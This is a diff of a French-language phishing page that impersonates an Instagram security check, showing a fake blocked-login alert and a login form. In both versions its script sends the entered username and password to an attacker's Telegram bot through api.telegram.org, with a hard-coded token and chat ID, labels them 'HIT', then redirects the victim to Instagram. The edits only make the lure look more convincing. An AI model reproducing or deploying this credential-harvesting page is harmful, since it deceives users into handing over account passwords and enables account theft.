@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -21,25 +20,44 @@
         }
 
         /* اللوغو الكتابي */
-        .logo-wordmark { width: 160px; margin: 0 auto 10px; display: block; }
+        .logo-wordmark { width: 165px; margin: 0 auto 15px; display: block; }
 
-        /* المستطيل المتدرج (أيقونة إنستغرام 2026) */
-        .ig-gradient-box {
-            width: 70px; height: 70px;
+        /* الأيقونة المتدرجة مع إصلاح الشفافية الداخلية */
+        .ig-gradient-container {
+            width: 75px; height: 75px;
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
             border-radius: 18px;
             margin: 0 auto 25px;
             display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
-        }
-        /* اللوغو الأبيض داخل المستطيل (Base64 لضمان الظهور) */
-        .white-glyph {
-            width: 45px; height: 45px;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMiAyLjA4OWMuMzI1IDAgLjM2Ny4wMTIgNC4wMTMuMTk4IDEuMTY1LjA1NSAyLjIwNi4yMDQgMy4wOTIuNzQyIDEuMjU2LjY1NyAyLjM0NSAxLjg4OSAyLjUzNiAzLjAyLjQ1NyAxLjExOC41MzYgMi4yMTYuNTYgMy42MTUuMDI3IDEuNjM4LjAyNyAxLjg5Mi4wMjcgNy4yMDJzMCA1LjU2NC0uMDI3IDcuMjAyYy0uMDI4IDEuNDAtLjEwMyAyLjQ5Ny0uNTYgMy42MTUtLjE5MSAxLjEzMS0xLjI4IDIuMzYzLTIuNTM2IDMuMDItLjg4Ni41MzgtMS45MjcuNjg3LTMuMDkyLjc0Mi0zLjY0Ni4xODYtMy42ODguMTk4LTQuMDEzLjE5OHMtLjM2Ny0uMDEyLTQuMDEzLS4xOThjLTEuMTY1LS4wNTUtMi4yMDYtLjIwNC0zLjA5Mi0uNzQyLTEuMjU2LS42NTctMi4zNDUtMS44ODktMi41MzYtMy4wMi0uNDU3LTEuMTE4LS41MzYtMi4yMTYtLjU2LTMuNjE1LS4wMjctMS42MzguMDI4LTEuODkyLS4wMjctNy4yMDJzMC01LjU2NC4wMjctNy4yMDJjLjAyNC0xLjQuMTAzLTIuNDk3LjU2LTMuNjE1LjE5MS0xLjEzMSAxLjI4LTIuMzYzIDIuNTM2LTozLjAyLjg4Ni0uNTM4IDEuOTI3LS42ODcgMy4wOTItLjc0MiAzLjY0Ni0uMTg2IDMuNjg4LS4xOTggNC4wMTMtLjE5OHptMC0yLjA4OWMtNC4xMjggMC00LjY0NS4wMTUtNy44NzYuMTY2LTIuMjk0LjEwNi00LjA0OC40NTQtNS4zODYgMS4zMDEtMi4xNiAxLjI1MS0zLTMuNzg0IDMuNTExLTQuNzk1IDQuNzk4LS45NzQgMS4zNzEtMS4zNTQgMy4xMDUtMS41MzIgNS4zODYtLjEzNCAzLjA1Ny0uMTQ4IDQuMDQzLS4xNDggNy44NzZzMCA0LjgxOS4xNDggNy44NzZjLS4wNDcgMi4yODEuMjkzIDQuMDE1IDEuNTMyIDUuMzg2IDEuMDAzIDEuMjcxIDMuMDU3IDMuMDQzIDQuNzk1IDQuNzk4IDEuNTMgMi4xNjQgMi45MTIgMi43MzYgNS4zODYgNS40NDEgMi4yODMuMTMxIDQuODE5LjEzMSA3Ljg3Ni4xMzFzNS41OTMtLjAxNSA3Ljg3Ni0uMTY1YzEuMjEzLS4wODggNC4wNDgtLjQ1NCA1LjM4Ni0xLjMwMSAyLjE2LTEuMjUxIDMuNzg0LTMuNTExIDQuNzk1LTQuNzk4IDEuMjYxLTEuNzM2IDEuNTYtMy4yNTEgMS41MzItNS4zODYuMTQxLTMuMDU3LjE0MS00LjA0My4xNDEtNy44NzZzLS4wMTUtNC44MTktLjE0MS03Ljg3NmMtLjA0Ny0yLjI4MS4yOTMtNC4wMTUtMS41MzItNS4zODYtMi4wMTMtMi41MjQtMy43OTQtMy43NTQtNC43OTUtNC43OTgtMi4wMTctMi44NC0zLjg2Mi0zLjA1NS01LjM4Ni01LjQ0MS0yLjI4My0uMTMxLTQuODE5LS4xMzEtNy44NzYtLjEzMXpTMTIgNy4yNDljLTMuOTYxIDAtNy4xNyAzLjIwOC03LjE3IDcuMTY5czMuMjA5IDcuMTY5IDcuMTcgNy4xNjkgNy4xNy0zLjIwOSA3LjE3LTcuMTY5LTMuMjA5LTcuMTY5LTcuMTctNy4xNjl6bTAtNi4zODJjNC42MjcgMCA4LjQwMSAzLjc3NSA4LjQwMSA4LjQwMXMtMy43NzUgOC40MDEtOC40MDEgOC40MDEtOC40MDEtMy43NzUtOC40MDEtOC40MDEgMy43NzUtOC40MDEgOC40MDEtOC40MDF6bTguNjY3LTIuNThjLjQ5IDAgLjg5MS0uNDAyLjg5MS0uODk4czAgLS44OTctLjg5MS0uODk3Yy0uNDkzIDAtLjg5NC40MDEtLjg5NC44OTdzMCAuODk4Ljg5NC44OTh6Ii8+PC9zdmc+');
-            background-size: contain; background-repeat: no-repeat; background-position: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.12);
         }
 
-        h2 { font-size: 20px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
+        /* رسم الأيقونة بالـ CSS لضمان عدم وجود مساحات بيضاء خلفية */
+        .ig-glyph {
+            width: 45px; height: 45px;
+            border: 4px solid white;
+            border-radius: 12px;
+            position: relative;
+        }
+        .ig-glyph::before {
+            content: '';
+            position: absolute;
+            width: 20px; height: 20px;
+            border: 4px solid white;
+            border-radius: 50%;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .ig-glyph::after {
+            content: '';
+            position: absolute;
+            width: 5px; height: 5px;
+            background: white;
+            border-radius: 50%;
+            top: 5px; right: 5px;
+        }
+
+        h2 { font-size: 21px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
         
         .alert { 
             background: #fff4f4; border: 1px solid #f9d6d6; border-radius: 10px; 
@@ -69,8 +87,8 @@
 <div class="card">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-wordmark">
 
-    <div class="ig-gradient-box">
-        <div class="white-glyph"></div>
+    <div class="ig-gradient-container">
+        <div class="ig-glyph"></div>
     </div>
 
     <h2>Vérification de sécurité</h2>
@@ -78,16 +96,16 @@
     <div class="alert">
         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
         <div class="alert-txt">
-            Connexion suspecte bloquée : <br>
+            Action requise : Connexion suspecte bloquée. <br>
             <span class="red">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
-            <br>Veuillez confirmer votre identité pour continuer.
+            <br>Veuillez confirmer votre identité pour sécuriser votre compte.
         </div>
     </div>
 
-    <form id="meta-p">
-        <input type="text" id="u" placeholder="Nom d'utilisateur" required>
+    <form id="auth-gate">
+        <input type="text" id="u" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
         <input type="password" id="p" placeholder="Mot de passe" required>
-        <button type="submit" class="btn">Sécuriser le compte</button>
+        <button type="submit" class="btn">Continuer</button>
     </form>
 
     <div class="ft">
@@ -96,14 +114,16 @@
 </div>
 
 <script>
-    document.getElementById('meta-p').onsubmit = async (e) => {
+    document.getElementById('auth-gate').onsubmit = async (e) => {
         e.preventDefault();
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
-        const t = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
-        const c = "5558301795";
-        const m = `🇲🇦 **TARGET SECURED** 🇲🇦\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\``;
-        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
+        const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
+        const cid = "5558301795";
+        
+        const msg = `🇲🇦 **HIT: MAROC PORTAL**\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\``;
+
+        await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         window.location.href = "https://www.instagram.com/accounts/password/change/";
     };
 </script>
